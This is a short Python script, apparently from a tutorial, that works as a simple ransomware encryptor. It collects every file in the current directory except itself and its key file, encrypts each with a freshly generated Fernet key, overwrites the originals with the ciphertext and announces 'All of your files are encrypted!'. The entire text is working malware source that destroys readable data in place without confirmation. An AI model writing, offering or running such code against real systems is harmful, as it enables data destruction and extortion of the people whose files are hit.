import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
        continue
    # This checks to see if the file in the directory is a file.
    if os.path.isfile(file):
        files.append(file)
print(files)

key = Fernet.generate_key()

# Creates a file .key and call that object the key. Can write binary.
with open("key.key", "wb") as thekey:
    thekey.write(key)                   # After open, will write the saved key value into the file.

for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)  # encrypting the contents generated for each file
    with open(file, "wb") as f:
        f.write(contents_encrypted)                     # write it back as an encrypted file

print("All of your files are encrypted!")